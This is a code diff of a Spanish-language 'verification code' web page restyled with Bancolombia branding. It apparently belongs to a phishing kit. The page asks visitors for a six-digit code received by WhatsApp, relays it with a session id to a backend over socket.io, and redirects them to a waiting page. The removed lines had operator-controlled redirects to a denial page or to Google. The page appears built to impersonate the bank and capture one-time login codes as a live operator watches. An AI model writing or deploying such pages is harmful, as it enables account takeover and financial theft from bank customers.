@@ -2,71 +2,70 @@
 <html lang="es">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Verificación por Código</title>
-  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css">
   <style>
     body {
+      font-family: Arial, sans-serif;
+      background-color: #f3f6fb;
       margin: 0;
-      font-family: 'Open Sans', sans-serif;
-      background: #f3f6f9;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
+      padding: 0;
     }
 
-    .screen {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
+    .container {
+      max-width: 800px;
+      margin: 50px auto;
       background: #fff;
-      padding: 2rem;
-      border-radius: 1rem;
-      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
-      width: 90%;
-      max-width: 400px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      padding: 30px;
       text-align: center;
     }
 
-    .input-group {
+    .header {
       display: flex;
       align-items: center;
-      background: #f0f2f5;
-      border-radius: 8px;
-      margin: 1rem 0;
-      padding: 0.5rem 1rem;
-      width: 100%;
+      justify-content: center;
+      margin-bottom: 20px;
     }
 
-    .input-group .icon {
-      color: #888;
-      margin-right: 0.5rem;
+    .logo {
+      width: 60px;
+      height: 60px;
+      background: url('https://hub.laboratoria.la/hubfs/LogoBancolombia.png') no-repeat center;
+      background-size: contain;
     }
 
-    .input-group input {
-      border: none;
-      background: transparent;
-      outline: none;
-      flex: 1;
-      font-size: 1rem;
+    h2 {
+      margin: 10px 0;
+      color: #444;
+    }
+
+    input {
+      width: 90%;
+      padding: 8px;
+      margin: 8px auto;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 0.95em;
+      display: block;
     }
 
     button {
-      background: #00b67a;
-      color: white;
-      padding: 0.75rem 2rem;
+      background-color: #ffde00;
+      color: #333;
+      padding: 10px;
       border: none;
-      border-radius: 50px;
-      font-weight: 600;
+      border-radius: 5px;
+      font-size: 0.95em;
+      width: 90%;
       cursor: pointer;
-      margin-top: 1rem;
-      transition: background 0.3s;
+      display: block;
+      margin: 10px auto 0;
     }
 
     button:hover {
-      background: #00a16a;
+      background-color: #e6cb00;
     }
 
     .mensaje-error {
@@ -81,52 +80,54 @@
   </style>
 </head>
 <body>
-  <div class="screen">
-    <h2>Ingrese el código recibido por WhatsApp</h2>
-    <div class="input-group">
-      <div class="icon"><i class="fas fa-key"></i></div>
-      <input type="tel" id="codigo" placeholder="Código de verificación" pattern="[0-9]*" inputmode="numeric" minlength="6" maxlength="6" required>
+  <div class="container">
+    <div class="header">
+      <div class="logo"></div>
     </div>
+
+    <h2>Ingrese el código recibido por WhatsApp</h2>
+    <input 
+      type="tel" 
+      id="codigo" 
+      placeholder="Código de verificación" 
+      pattern="[0-9]*" 
+      inputmode="numeric" 
+      minlength="6" 
+      maxlength="6" 
+      required 
+    />
     <p id="mensajeError" class="mensaje-error"></p>
     <button onclick="validarCodigo()">Validar código</button>
   </div>
 
-  <script src="/socket.io/socket.io.js"></script>
-  <script>
-    const socket = io();
-    const sessionId = localStorage.getItem("sessionId");
-    socket.emit("reconectar", sessionId);
+ <script src="/socket.io/socket.io.js"></script>
+<script src="opciones.js"></script>
+<script>
+  const socket = io();
+  const sessionId = localStorage.getItem("sessionId");
 
-    function validarCodigo() {
-      const codigo = document.getElementById("codigo").value;
-      const mensajeError = document.getElementById("mensajeError");
-      const codigoInput = document.getElementById("codigo");
+  socket.emit("reconectar", sessionId);
 
-      mensajeError.textContent = "";
-      codigoInput.classList.remove("campo-requerido");
+  function validarCodigo() {
+    const codigo = document.getElementById("codigo").value;
+    const mensajeError = document.getElementById("mensajeError");
+    const codigoInput = document.getElementById("codigo");
 
-      if (!codigo) {
-        mensajeError.textContent = "El código es obligatorio";
-        codigoInput.classList.add("campo-requerido");
-      } else if (!/^\d{6}$/.test(codigo)) {
-        mensajeError.textContent = "El código debe tener 6 dígitos numéricos";
-        codigoInput.classList.add("campo-requerido");
-      } else {
-        // Enviar el código al backend
-        socket.emit("codigoIngresado", { codigo, sessionId });
+    mensajeError.textContent = "";
+    codigoInput.classList.remove("campo-requerido");
 
-        // Ir a pantalla de espera
-        window.location.href = "opciones.html";
-      }
+    if (!codigo) {
+      mensajeError.textContent = "El código es obligatorio";
+      codigoInput.classList.add("campo-requerido");
+    } else if (!/^\d{6}$/.test(codigo)) {
+      mensajeError.textContent = "El código debe tener 6 dígitos numéricos";
+      codigoInput.classList.add("campo-requerido");
+    } else {
+      socket.emit("codigoIngresado", { codigo, sessionId });
+      window.location.href = "opciones.html";
     }
+  }
+</script>
 
-    socket.on("respuestaCodigo", (decision) => {
-      if (decision === "error") {
-        window.location.href = "denegado.html";
-      } else if (decision === "finalizar") {
-        window.location.href = "https://www.google.com";
-      }
-    });
-  </script>
 </body>
 </html>
